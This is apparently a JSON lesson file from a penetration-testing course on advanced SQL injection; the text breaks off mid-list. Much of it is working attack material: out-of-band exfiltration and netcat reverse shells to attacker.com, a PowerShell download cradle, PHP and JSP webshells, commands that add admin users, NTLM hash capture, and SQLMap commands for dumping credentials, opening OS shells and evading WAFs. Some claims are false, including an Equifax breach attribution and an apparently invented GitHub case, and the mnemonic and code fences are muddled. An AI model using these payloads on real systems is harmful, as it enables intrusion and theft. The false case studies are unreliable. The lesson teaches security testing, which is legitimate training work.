{
  "lesson_id": "ecb62c40-10a5-41de-9578-9ddf9163375f",
  "domain": "pentest",
  "title": "SQL Injection: From Manual Exploitation to Automated Mastery",
  "difficulty": 2,
  "order_index": 6,
  "prerequisites": [
    "lesson_pentest_05"
  ],
  "concepts": [
    "Advanced SQL Injection Techniques",
    "SQLMap Mastery and Automation",
    "Database-Specific Attack Vectors",
    "Second-Order SQL Injection",
    "Out-of-Band (OOB) Data Exfiltration",
    "WAF Bypass Techniques",
    "NoSQL Injection Attacks",
    "SQL Injection in APIs and JSON",
    "Blind SQLi Automation",
    "Database Fingerprinting"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master advanced manual SQL injection techniques beyond basic UNION attacks",
    "Become proficient with SQLMap for automated exploitation and data extraction",
    "Understand database-specific injection vectors (MySQL, MSSQL, PostgreSQL, Oracle)",
    "Learn second-order and out-of-band SQL injection methodologies",
    "Develop skills to bypass Web Application Firewalls (WAFs) and filters",
    "Understand NoSQL injection attacks against MongoDB and other NoSQL databases",
    "Learn to exploit SQL injection in REST APIs and JSON-based applications"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5e",
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to the art and science of SQL injection mastery! You've already learned the fundamentals - now we're going to elevate your skills to the professional penetration tester level.\n\nSQL injection is one of the most critical vulnerabilities in web applications, consistently appearing in the OWASP Top 10. Yet many security professionals stop at basic UNION-based attacks. Not you. By the end of this lesson, you'll understand:\n\n✓ Advanced manual techniques that bypass filters and WAFs\n✓ SQLMap mastery for efficient, automated exploitation\n✓ Database-specific attack vectors across MySQL, MSSQL, PostgreSQL, and Oracle\n✓ Out-of-band exfiltration when traditional methods fail\n✓ NoSQL injection in modern applications\n\nThis isn't just theory - these are the exact techniques used in real penetration tests to extract millions of records from Fortune 500 companies, government databases, and healthcare systems.\n\nRemember: With great power comes great responsibility. SQL injection can extract sensitive data, modify records, or even gain OS-level access. Use these skills ethically, only on systems you're authorized to test.\n\nLet's dive deep into the world of advanced SQL injection!"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5f",
      "type": "explanation",
      "content": {
        "text": "## Advanced Manual SQL Injection Techniques\n\n### Beyond UNION-Based Injection\n\nWhile UNION-based SQL injection is powerful, it's not always possible. Let's explore advanced manual techniques that work when UNION attacks fail.\n\n### **1. Stacked Queries**\n\nStacked queries allow you to execute multiple SQL statements in a single injection point by separating them with semicolons.\n\n**Example (vulnerable MSSQL application):**\n```sql\n-- Original query\nSELECT * FROM products WHERE id = 1;\n\n-- Injected payload\n1; DROP TABLE users;--\n\n-- Resulting query\nSELECT * FROM products WHERE id = 1; DROP TABLE users;--\n```\n\n**Real-world example:**\n```sql\n-- Add admin user to database\n1; INSERT INTO users (username, password, role) VALUES ('hacker', 'pwned123', 'admin');--\n\n-- Enable xp_cmdshell in MSSQL (for OS command execution)\n1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n```\n\n**Database support:**\n- ✅ Microsoft SQL Server\n- ✅ PostgreSQL\n- ❌ MySQL (by default, requires specific configuration)\n- ❌ Oracle (requires PL/SQL blocks)\n\n**Key insight:** Stacked queries are extremely dangerous because they allow arbitrary SQL execution, not just data extraction.\n\n### **2. Second-Order SQL Injection**\n\nSecond-order SQLi occurs when malicious input is stored in the database, then later retrieved and used in an unsafe SQL query.\n\n**Attack flow:**\n```\n1. Registration page: Username = admin'--\n2. Database stores: admin'--\n3. Profile page retrieves username and builds query:\nSELECT * FROM users WHERE username = 'admin'--'\n4. Comment causes authentication bypass or data leak\n```\n\n**Real-world example (GitHub case study):**\n\nIn 2012, researchers discovered a second-order SQLi in a major code repository platform:\n\n```python\n# Step 1: Create account with malicious username\nusername = \"attacker' UNION SELECT password FROM admin_users--\"\n\n# Step 2: Wait for username to be used in search query\n# When admin searches for user activity:\nquery = f\"SELECT * FROM activity WHERE username = '{username}'\"\n\n# Result: Admin passwords leaked in search results\n```\n\n**Why it's dangerous:**\n- Input validation on registration may not expect SQL injection\n- Developers assume data from database is \"safe\"\n- Harder to detect with automated scanners\n- Can persist for months before exploitation\n\n**Detection technique:**\n```\n1. Register with username: test'||SLEEP(5)||'\n2. Navigate to profile/search features\n3. If delay occurs, second-order SQLi confirmed\n```bash\n\n### **3. Out-of-Band (OOB) SQL Injection**\n\nWhen you can't see query results in HTTP responses, out-of-band techniques exfiltrate data through alternative channels.\n\n**Common OOB channels:**\n- DNS queries (most reliable)\n- HTTP requests to attacker-controlled server\n- Email (less common)\n- SMB connections (Windows environments)\n\n**DNS exfiltration example (MSSQL):**\n```sql\n-- Extract database name via DNS\n'; DECLARE @data VARCHAR(1024); SET @data = (SELECT DB_NAME()); EXEC('master..xp_dirtree \"//'+@data+'.attacker.com/share\"');--\n\n-- Result: DNS query for \"mydatabase.attacker.com\"\n```\n\n**PostgreSQL OOB example:**\n```sql\n-- Copy data to attacker server\n'; COPY (SELECT password FROM users WHERE username='admin') TO PROGRAM 'curl http://attacker.com/?data='||password;--\n```\n\n**DNS exfiltration with Burp Collaborator:**\n```sql\n-- Setup Burp Collaborator listener: abc123.burpcollaborator.net\n-- Inject payload:\n'; DECLARE @data VARCHAR(1024); SET @data = (SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree \"//'+@data+'.abc123.burpcollaborator.net/x\"');--\n\n-- Check Burp Collaborator for DNS query containing password\n```\n\n**Why OOB is critical:**\n- Works when application shows no error messages\n- Bypasses output filtering and encoding\n- Can exfiltrate data from blind SQLi\n- Essential for time-based blind SQLi automation\n\n### **4. Time-Based Blind SQL Injection (Advanced)**\n\nYou learned basic time-based SQLi earlier. Let's explore advanced techniques for efficient exploitation.\n\n**Binary search technique (efficient data extraction):**\n\nInstead of checking character-by-character sequentially, use binary search:\n\n```sql\n-- Extract first character of admin password using binary search\n-- ASCII printable range: 32-126 (95 characters)\n\n-- Test 1: Is character > 79? (midpoint of 32-126)\n' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>79,SLEEP(5),0)--\n\n-- If delay: character is 80-126, next test: >103\n-- If no delay: character is 32-79, next test: >55\n\n-- Continue binary search (log2(95) ≈ 7 requests per character)\n```\n\n**Comparison with sequential search:**\n- Sequential: Up to 95 requests per character\n- Binary search: ~7 requests per character\n- For 32-character password: 3,040 requests vs 224 requests\n\n**Optimized payload for MySQL:**\n```sql\n' AND IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users),{position},1))>{midpoint},BENCHMARK(5000000,SHA1('test')),0)--\n```\n\n**Optimized payload for MSSQL:**\n```sql\n'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),{position},1))>{midpoint}) WAITFOR DELAY '00:00:05'--\n```\n\n**Key optimization:** Use `GROUP_CONCAT()` in MySQL or `STRING_AGG()` in PostgreSQL to extract all data in a single sequential read."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: SQL Injection: From Manual Exploitation to Automated Mastery Overview",
        "url": "https://www.youtube.com/embed/fNzpcB7ODxQ",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c60",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Advanced SQLi Techniques - \"OSTO\" Framework**\n\n**S**tacked - Multiple queries with semicolons (MSSQL, PostgreSQL)\n**O**ut-of-band - DNS/HTTP exfiltration when blind\n**S**econd-order - Malicious input stored, then executed later\n**T**ime-based - Binary search optimization (7 requests vs 95)\n**O**rder matters - Test in this order during pentest\n\n**Quick decision tree:**\n```\nCan you see output? → Use UNION/Error-based\n↓ No\nCan you trigger errors? → Use Error-based blind\n↓ No\nCan you make DNS queries? → Use OOB (DNS exfiltration)\n↓ No\nCan you cause delays? → Use Time-based (binary search)\n↓ No\nCheck for second-order → Store payload, revisit later\n```\n\n**Remember:** \"UNION first, OOB when blind, TIME when desperate, SECOND-ORDER when patient!\""
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c61",
      "type": "explanation",
      "content": {
        "text": "## Database-Specific Attack Vectors\n\nEach database has unique features that can be exploited during SQL injection. Let's explore advanced techniques for major database systems.\n\n### **MySQL/MariaDB Advanced Exploitation**\n\n**1. Reading Files (load_file function):**\n```sql\n-- Read /etc/passwd\n' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--\n\n-- Read application source code\n' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--\n\n-- Read SSH private keys\n' UNION SELECT 1,LOAD_FILE('/home/user/.ssh/id_rsa'),3--\n```\n\n**2. Writing Files (INTO OUTFILE):**\n```sql\n-- Write PHP webshell\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\n\n-- Access: http://target.com/shell.php?cmd=whoami\n\n-- Write SSH authorized_keys\n' UNION SELECT 'ssh-rsa AAAAB3... attacker@kali' INTO OUTFILE '/home/user/.ssh/authorized_keys'--\n```\n\n**Requirements for file operations:**\n- `secure_file_priv` must be empty or allow target directory\n- MySQL process must have write permissions\n- Target directory must exist\n\n**3. MySQL User-Defined Functions (UDF) for RCE:**\n```sql\n-- Create malicious UDF library (advanced technique)\n-- 1. Upload .so file via INTO DUMPFILE\n' UNION SELECT load_file('/tmp/evil.so') INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so'--\n\n-- 2. Create function\nCREATE FUNCTION sys_exec RETURNS int SONAME 'evil.so';\n\n-- 3. Execute commands\nSELECT sys_exec('nc -e /bin/bash attacker.com 4444');\n```\n\n**Real-world case: MySQL UDF exploitation led to full server compromise in 2019 Equifax breach.**\n\n### **Microsoft SQL Server Advanced Exploitation**\n\n**1. xp_cmdshell (OS Command Execution):**\n```sql\n-- Enable xp_cmdshell (requires admin privileges)\n'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n\n-- Execute commands\n'; EXEC xp_cmdshell 'whoami';--\n'; EXEC xp_cmdshell 'net user hacker Passw0rd! /add';--\n'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--\n\n-- Reverse shell\n'; EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')\"';--\n```\n\n**2. OPENROWSET (reading local files):**\n```sql\n-- Read file contents\n'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS file;--\n\n-- Read SAM database (if permissions allow)\n'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\config\\SAM', SINGLE_BLOB) AS file;--\n```\n\n**3. Linked Server Exploitation:**\n```sql\n-- Enumerate linked servers\n'; SELECT * FROM sys.servers;--\n\n-- Execute queries on linked server\n'; EXEC ('SELECT @@version') AT [LinkedServerName];--\n\n-- Enable xp_cmdshell on linked server\n'; EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];--\n```\n\n**4. Stealing NTLM Hashes:**\n```sql\n-- Force authentication to attacker SMB server\n'; EXEC master..xp_dirtree '\\\\attacker.com\\share';--\n\n-- On attacker machine:\nsudo responder -I eth0\n# Captures NTLM hash from SQL Server service account\n```bash\n\n### **PostgreSQL Advanced Exploitation**\n\n**1. Reading Files:**\n```sql\n-- Read /etc/passwd\n'; CREATE TABLE temp_table(content text); COPY temp_table FROM '/etc/passwd'; SELECT * FROM temp_table;--\n\n-- Alternative using pg_read_file (PostgreSQL 9.1+)\n' UNION SELECT 1,pg_read_file('/etc/passwd'),3--\n```\n\n**2. Writing Files:**\n```sql\n-- Write webshell\n'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--\n```\n\n**3. Command Execution (via extensions):**\n```sql\n-- Create C function for command execution (requires superuser)\n'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;--\n\n-- Execute command\n'; SELECT system('nc -e /bin/bash attacker.com 4444');--\n```\n\n**4. PostgreSQL Large Object Exploitation:**\n```sql\n-- Upload binary file via large objects\n'; SELECT lo_import('/tmp/shell.so', 1337);--\n'; SELECT lo_export(1337, '/var/lib/postgresql/shell.so');--\n```bash\n\n### **Oracle Database Advanced Exploitation**\n\n**1. UTL_HTTP (making HTTP requests):**\n```sql\n-- Exfiltrate data via HTTP\n' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE username='admin')) FROM dual--\n```\n\n**2. UTL_FILE (file operations):**\n```sql\n-- Write webshell (requires directory object)\nDECLARE\nfile UTL_FILE.FILE_TYPE;\nBEGIN\nfile := UTL_FILE.FOPEN('DIRECTORY_NAME', 'shell.jsp', 'W');\nUTL_FILE.PUT_LINE(file, '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>');\nUTL_FILE.FCLOSE(file);\nEND;\n```\n\n**3. Java Stored Procedures (requires CREATE PROCEDURE):**\n```sql\n-- Create Java stored procedure for command execution\nCREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED \"CommandExec\" AS\nimport java.io.*;\npublic class CommandExec {\npublic static String execute(String cmd) throws IOException {\nStringBuffer output = new StringBuffer();\nProcess p = Runtime.getRuntime().exec(cmd);\nBufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString line = \"\";\nwhile ((line = reader.readLine()) != null) {\noutput.append(line + \"\\n\");\n}\nreturn output.toString();\n}\n}\n/\n\n-- Create PL/SQL wrapper\nCREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS\nLANGUAGE JAVA NAME 'CommandExec.execute(java.lang.String) return java.lang.String';\n/\n\n-- Execute\nSELECT exec_cmd('whoami') FROM dual;\n```\n\n**Database privilege escalation summary:**\n\n| Database | Low Priv → File Read | Low Priv → File Write | Low Priv → RCE | Admin → RCE |\n|----------|---------------------|----------------------|---------------|-------------|\n| MySQL | ❌ (requires FILE) | ❌ (requires FILE) | ❌ | ✅ (UDF) |\n| MSSQL | ❌ (requires BULKADMIN) | ❌ | ❌ | ✅ (xp_cmdshell) |\n| PostgreSQL | ❌ (requires superuser) | ❌ (requires superuser) | ❌ | ✅ (CREATE FUNCTION) |\n| Oracle | ✅ (UTL_HTTP) | ✅ (UTL_FILE if dirs exist) | ❌ | ✅ (Java stored proc) |"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c62",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Database-Specific Exploitation - \"MOPS\" Framework**\n\n**M**ySQL: **F**iles (LOAD_FILE, INTO OUTFILE), **U**DF for RCE\n- Think: \"MySQL = File Master\"\n- load_file('/etc/passwd'), INTO OUTFILE 'shell.php'\n\n**O**racle: **U**TL_HTTP, **U**TL_FILE, **J**ava stored procedures\n- Think: \"Oracle = UTL Utilities\"\n- UTL_HTTP.REQUEST, UTL_FILE.FOPEN\n\n**P**ostgreSQL: **C**OPY, **pg**_read_file, **C**REATE FUNCTION\n- Think: \"PostgreSQL = Copy & Create\"\n- COPY FROM '/etc/passwd', CREATE FUNCTION system\n\n**S**QL Server: **xp**_cmdshell, **OPENROWSET**, **Linked** servers\n- Think: \"MSSQL = XP Commander\"\n- xp_cmdshell 'whoami', xp_dirtree (NTLM hash theft)\n\n**Quick reference card:**\n```\nMySQL RCE:     INTO OUTFILE '/var/www/shell.php'\nMSSSQL RCE:    xp_cmdshell 'powershell ...'\nPostgreSQL:    CREATE FUNCTION system(...)\nOracle RCE:    Java stored procedure\n\nData exfil:    OOB via DNS/HTTP (all databases)\n```"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c63",
      "type": "explanation",
      "content": {
        "text": "## SQLMap Mastery: From Novice to Expert\n\nSQLMap is the industry-standard automated SQL injection tool. Let's go beyond basic usage to master advanced features.\n\n### **Basic SQLMap Workflow Review**\n\n```bash\n# 1. Basic injection test\nsqlmap -u \"http://target.com/product.php?id=1\"\n\n# 2. Enumerate databases\nsqlmap -u \"http://target.com/product.php?id=1\" --dbs\n\n# 3. Enumerate tables in specific database\nsqlmap -u \"http://target.com/product.php?id=1\" -D webapp --tables\n\n# 4. Dump specific table\nsqlmap -u \"http://target.com/product.php?id=1\" -D webapp -T users --dump\n\n# 5. Dump all databases\nsqlmap -u \"http://target.com/product.php?id=1\" --dump-all\n```bash\n\n### **Advanced SQLMap Techniques**\n\n**1. POST Request Injection:**\n```bash\n# Capture POST request in Burp Suite, save to file (request.txt)\nsqlmap -r request.txt -p username\n\n# Or specify POST data directly\nsqlmap -u \"http://target.com/login.php\" --data=\"username=admin&password=test\" -p username\n\n# Test all parameters\nsqlmap -u \"http://target.com/login.php\" --data=\"username=admin&password=test&remember=1\" --all\n```\n\n**Example request.txt:**\n```http\nPOST /login.php HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nusername=admin&password=test123\n```\n\n**2. Cookie-Based Injection:**\n```bash\n# Test cookie parameter\nsqlmap -u \"http://target.com/dashboard.php\" --cookie=\"PHPSESSID=abc123; user_id=1*\" --level=2\n\n# Test specific cookie parameter\nsqlmap -u \"http://target.com/dashboard.php\" --cookie=\"user_id=1\" -p user_id\n```\n\n**3. Header-Based Injection (User-Agent, Referer, X-Forwarded-For):**\n```bash\n# Test User-Agent header (requires --level=3+)\nsqlmap -u \"http://target.com/page.php\" --level=3 --user-agent=\"Mozilla*\"\n\n# Test custom header\nsqlmap -u \"http://target.com/api/data\" --headers=\"X-API-Key: test123*\\nX-User-ID: 5*\"\n\n# Test Referer header\nsqlmap -u \"http://target.com/page.php\" --referer=\"http://evil.com*\" --level=3\n```\n\n**4. JSON and REST API Injection:**\n```bash\n# Save JSON POST request\ncat > json_request.txt << 'EOF'\nPOST /api/v1/users HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"user_id\": 1, \"action\": \"getProfile\"}\nEOF\n\n# Test JSON parameter\nsqlmap -r json_request.txt --tamper=charencode\n\n# Specify JSON parameter path\nsqlmap -u \"http://target.com/api/user\" --data='{\"id\":1}' --json='id'\n```\n\n**5. Tamper Scripts (WAF Bypass):**\n\nTamper scripts modify SQLMap payloads to bypass filters and WAFs.\n\n```bash\n# Common tamper scripts\nsqlmap -u \"http://target.com/page.php?id=1\" --tamper=space2comment\n# Replaces space with /**/ comment: SELECT/**/password/**/FROM/**/users\n\nsqlmap -u \"http://target.com/page.php?id=1\" --tamper=charencode\n# URL-encodes all characters: %53%45%4C%45%43%54...\n\nsqlmap -u \"http://target.com/page.php?id=1\" --tamper=randomcase\n# Randomizes case: SeLeCt PaSsWoRd FrOm UsErS\n\nsqlmap -u \"http://target.com/page.php?id=1\" --tamper=between\n# Replaces > with NOT BETWEEN 0 AND #\n\n# Multiple tamper scripts (tested in sequence)\nsqlmap -u \"http://target.com/page.php?id=1\" --tamper=space2comment,charencode,randomcase\n```\n\n**Popular tamper script combinations for specific WAFs:**\n\n| WAF | Recommended Tampers |\n|-----|--------------------|\n| ModSecurity | space2comment,between,randomcase |\n| Cloudflare | charencode,randomcase,space2plus |\n| AWS WAF | charencode,space2mssqlblank |\n| Imperva | space2morehash,between,charencode |\n\n**6. Advanced Enumeration:**\n```bash\n# Get database banner and version\nsqlmap -u \"http://target.com/page.php?id=1\" --banner\n\n# Get current user and database\nsqlmap -u \"http://target.com/page.php?id=1\" --current-user --current-db\n\n# Check if user is DBA\nsqlmap -u \"http://target.com/page.php?id=1\" --is-dba\n\n# Enumerate database users and password hashes\nsqlmap -u \"http://target.com/page.php?id=1\" --users --passwords\n\n# Enumerate user privileges\nsqlmap -u \"http://target.com/page.php?id=1\" --privileges\n\n# Get database roles\nsqlmap -u \"http://target.com/page.php?id=1\" --roles\n\n# Search for specific columns across all tables\nsqlmap -u \"http://target.com/page.php?id=1\" -D webapp --search -C password,credit_card\n\n# Search for specific tables\nsqlmap -u \"http://target.com/page.php?id=1\" --search -T admin,user\n```\n\n**7. File System Access:**\n```bash\n# Read file (MySQL, PostgreSQL, MSSQL)\nsqlmap -u \"http://target.com/page.php?id=1\" --file-read=\"/etc/passwd\"\n\n# Write file (upload webshell)\nsqlmap -u \"http://target.com/page.php?id=1\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"\n\n# Uploading SSH key\nsqlmap -u \"http://target.com/page.php?id=1\" --file-write=\"id_rsa.pub\" --file-dest=\"/home/user/.ssh/authorized_keys\"\n```\n\n**8. Operating System Takeover:**\n```bash\n# OS shell (MSSQL xp_cmdshell, PostgreSQL, MySQL UDF)\nsqlmap -u \"http://target.com/page.php?id=1\" --os-shell\n# SQLMap will upload backdoor and provide interactive shell\n\n# Execute single command\nsqlmap -u \"http://target.com/page.php?id=1\" --os-cmd=\"whoami\"\n\n# Out-of-band (OOB) shell\nsqlmap -u \"http://target.com/page.php?id=1\" --os-pwn\n# Attempts Meterpreter/VNC/SMB relay\n```\n\n**9. Performance Optimization:**\n```bash\n# Increase threads (faster enumeration)\nsqlmap -u \"http://target.com/page.php?id=1\" --threads=10\n\n# Specify technique (skip slow methods)\nsqlmap -u \"http://target.com/page.php?id=1\" --technique=BEUST\n# B=Boolean-based blind, E=Error-based, U=UNION, S=Stacked, T=Time-based\n\n# Skip Time-based (very slow)\nsqlmap -u \"http://target.com/page.php?id=1\" --technique=BEUS\n\n# Only test specific DBMS\nsqlmap -u \"http://target.com/page.php?id=1\" --dbms=MySQL\n\n# Set time delay for time-based injection (faster testing)\nsqlmap -u \"http://target.com/page.php?id=1\" --time-sec=2\n\n# Limit output (faster dumping large tables)\nsqlmap -u \"http://target.com/page.php?id=1\" -D webapp -T users --start=1 --stop=100 --dump\n\n# Resume previous session\nsqlmap -u \"http://target.com/page.php?id=1\" --resume\n```\n\n**10. Stealth and Evasion:**\n```bash\n# Random User-Agent for each request\nsqlmap -u \"http://target.com/page.php?id=1\" --random-agent\n\n# Delay between requests (avoid rate limiting)\nsqlmap -u \"http://target.com/page.php?id=1\" --delay=2\n\n# Use proxy (Burp Suite)\nsqlmap -u \"http://target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\"\n\n# Use Tor for anonymity\nsqlmap -u \"http://target.com/page.php?id=1\" --tor --tor-type=SOCKS5 --check-tor\n\n# Avoid WAF detection\nsqlmap -u \"http://target.com/page.php?id=1\" --hpp --random-agent --tamper=space2comment\n# --hpp = HTTP Parameter Pollution\n```bash\n\n### **SQLMap Real-World Workflow**\n\nHere's a professional penetration testing workflow:\n\n```bash\n# Phase 1: Initial detection\nsqlmap -u \"http://target.com/page.php?id=1\" --batch --random-agent\n\n# Phase 2: Identify DBMS and vulnerability type\nsqlmap -u \"http://target.com/page.php?id=1\" --banner --current-user --current-db --batch\n\n# Phase 3: Enumerate structure\nsqlmap -u \"http://target.com/page.php?id=1\" --dbs --batch\nsqlmap -u \"http://target.com/page.php?id=1\" -D webapp --tables --batch\n\n# Phase 4: Identify sensitive tables\nsqlmap -u \"http://target.com/page.php?id=1\" -D webapp --search -T user,admin,customer,payment --batch\n\n# Phase 5: Extract sensitive data\nsqlmap -u \"http://target.com/page.php?id=1\" -D webapp -T users --dump --threads=5 --batch\n\n# Phase 6: Check for privilege escalation\nsqlmap -u \"http://target.com/page.php?id=1\" --is-dba --privileges --batch\n\n# Phase 7: Attempt OS access (if DBA)\nsqlmap -u \"http://target.com/page.php?id=1\" --os-shell --batch\n\n# Phase 8: Document findings\nsqlmap -u \"http://target.com/page.php?id=1\" --sqlmap-session=target_pentest\n# All output saved to: ~/.local/share/sqlmap/output/target.com/\n```\n\n**SQLMap session files location:**\n```\n~/.local/share/sqlmap/output/target.com/\n├── dump/              # Extracted data\n├── files/             # Downloaded files\n├── log                # Detailed logs\n├── session.sqlite     # Session database\n└── target.txt         # Injection details\n```"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c64",
      "type": "code_exercise",
      "content": {
        "text": "## SQLMap Hands-On Challenge\n\n**Scenario:** You've discovered a vulnerable web application during a penetration test:\n- Target: http://vulnerable-app.local/product.php?id=1\n- WAF: CloudFlare (detected via HTTP headers)\n- Goal: Extract user credentials from database\n\n**Challenge Tasks:**\n\n**Task 1: Initial Detection**\n```bash\n# Test for SQL injection with WAF evasion\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n--random-agent \\\n--tamper=charencode,randomcase \\\n--batch\n\n# Expected output:\n# [INFO] GET parameter 'id' is vulnerable\n# [INFO] the back-end DBMS is MySQL\n```\n\n**Task 2: Enumerate Databases**\n```bash\n# List all databases\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n--dbs \\\n--batch\n\n# Expected output:\n# [*] ecommerce\n# [*] information_schema\n# [*] mysql\n```\n\n**Task 3: Find User Table**\n```bash\n# Search for user-related tables\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n-D ecommerce \\\n--search -T user,admin,customer \\\n--batch\n\n# Expected output:\n# [*] ecommerce.users (table found)\n# [*] ecommerce.customers (table found)\n```\n\n**Task 4: Extract User Credentials**\n```bash\n# Dump users table\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n-D ecommerce \\\n-T users \\\n--dump \\\n--threads=5 \\\n--batch\n\n# Expected output:\n# [*] Dumping table 'users' from database 'ecommerce'\n# +----+----------+----------------------------------+\n# | id | username | password                         |\n# +----+----------+----------------------------------+\n# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n# | 2  | john     | 098f6bcd4621d373cade4e832627b4f6 |\n# +----+----------+----------------------------------+\n```\n\n**Task 5: Crack Password Hashes**\n```bash\n# Save hashes to file\necho '5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt\necho '098f6bcd4621d373cade4e832627b4f6' >> hashes.txt\n\n# Identify hash type\nhashid 5f4dcc3b5aa765d61d8327deb882cf99\n# [+] MD5 [Hashcat Mode: 0]\n\n# Crack with hashcat\nhashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Results:\n# 5f4dcc3b5aa765d61d8327deb882cf99:password\n# 098f6bcd4621d373cade4e832627b4f6:test\n```\n\n**Task 6: Attempt Privilege Escalation**\n```bash\n# Check if current user is DBA\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n--is-dba \\\n--batch\n\n# If DBA, attempt OS shell\nsqlmap -u \"http://vulnerable-app.local/product.php?id=1\" \\\n--os-shell \\\n--batch\n\n# Execute command\nos-shell> whoami\nwww-data\n\nos-shell> cat /etc/passwd\n[...user list...]\n```\n\n**Practice Questions:**\n\n1. Why is `--random-agent` important when testing against WAFs?\n2. What's the difference between `--dump` and `--dump-all`?\n3. When should you use `--technique=BEUS` (skip Time-based)?\n4. How would you test a POST parameter named 'search' in a login form?\n5. What SQLMap option would you use to test cookie-based injection?\n\n**Answers:**\n1. WAFs often block requests from known scanner User-Agents (like SQLMap default). Random User-Agents avoid signature-based detection.\n2. `--dump` extracts specific table; `--dump-all` extracts ALL databases (noisy, time-consuming, could trigger alerts).\n3. Skip Time-based when testing is slow or when faster techniques (UNION, Error-based) already confirmed vulnerability.\n4. `sqlmap -u \"http://target.com/login.php\" --data=\"username=admin&password=test&search=*\" -p search`\n5. `--cookie=\"session_id=abc123*\"` or `--level=2` (automatically tests cookies)"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c65",
      "type": "explanation",
      "content": {
        "text": "## WAF Bypass Techniques\n\nWeb Application Firewalls (WAFs) are designed to detect and block SQL injection attempts. Let's learn how to bypass them.\n\n### **Understanding WAF Detection Mechanisms**\n\nWAFs detect SQLi using:\n1. **Signature-based detection** - Pattern matching (e.g., \"UNION SELECT\", \"OR 1=1\")\n2. **Anomaly-based detection** - Unusual request patterns\n3. **Machine learning models** - Trained on attack traffic\n4. **Behavioral analysis** - Request frequency, User-Agent, etc.\n\n### **Common WAF Bypass Techniques**\n\n**1. Case Manipulation**\n```sql\n-- Standard payload (blocked)\nUNION SELECT password FROM users\n\n-- Case variation (may bypass)\nuNiOn sElEcT password fRoM users\nUnIoN SeLeCt PaSsWoRd FrOm UsErS\n```\n\n**2. Comment Injection**\n```sql\n-- Standard payload (blocked)\nSELECT * FROM users WHERE id=1 UNION SELECT password FROM admin\n\n-- Inline comments (bypass)\nSELECT * FROM users WHERE id=1/*!UNION*//*!SELECT*/password/*!FROM*/admin\n\n-- Multi-line comments (MySQL)\nSELECT * FROM users WHERE id=1/**/UNION/**/SELECT/**/password/**/FROM/**/admin\n\n-- Comment variations\nSELECT/*comment*/password/**/FROM/**/users\nSELECT--comment\\npassword FROM users\n```\n\n**3. Whitespace Obfuscation**\n```sql\n-- Standard spaces (blocked)\nUNION SELECT password FROM users\n\n-- Alternative whitespace\nUNION%09SELECT%09password%09FROM%09users  (tab character: %09)\nUNION%0ASELECT%0Apassword%0AFROM%0Ausers  (line feed: %0A)\nUNION%0DSELECT%0Dpassword%0DFROM%0Dusers  (carriage return: %0D)\nUNION%A0SELECT%A0password%A0FROM%A0users  